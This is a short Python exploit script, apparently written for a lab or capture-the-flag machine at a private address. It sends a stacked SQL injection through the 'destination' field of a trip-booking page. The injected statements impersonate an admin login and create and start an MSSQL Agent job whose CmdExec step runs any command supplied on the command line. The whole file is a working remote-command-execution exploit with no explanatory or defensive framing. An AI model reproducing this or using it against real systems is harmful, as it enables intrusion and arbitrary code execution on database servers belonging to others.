#!/usr/bin/python3
import sys, random, string, requests

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[0]} <command>")
    sys.exit(1)

command = sys.argv[1]
target = "http://10.13.38.20/book-trip.php"
name = "".join(random.choices(string.ascii_lowercase, k=8))

query = f"""
use msdb;
exec as login = N'daedalus_admin';
exec msdb.dbo.sp_add_job @job_name = N'{name}_job';
exec msdb.dbo.sp_add_jobstep @job_name = N'{name}_job', @step_name = N'{name}_step', @subsystem = N'cmdexec', @command = N'C:\\Windows\\System32\\cmd.exe /c {command}', @retry_attempts = 1, @retry_interval = 5, @proxy_id = 1;
exec msdb.dbo.sp_add_jobserver @job_name = N'{name}_job';
exec msdb.dbo.sp_start_job @job_name = N'{name}_job';
"""

data = {"destination": f"'; {query}-- -"}
requests.post(target, data=data)
